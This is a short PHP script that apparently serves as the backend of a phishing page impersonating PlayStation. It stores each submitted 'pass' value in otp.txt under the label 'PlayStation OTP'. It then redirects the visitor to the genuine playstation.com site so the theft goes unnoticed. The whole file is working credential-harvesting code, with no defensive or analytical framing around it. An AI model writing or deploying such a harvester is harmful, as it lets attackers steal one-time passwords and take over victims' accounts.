<?php
file_put_contents("otp.txt", "PlayStation OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.playstation.com/en-in/');
?>
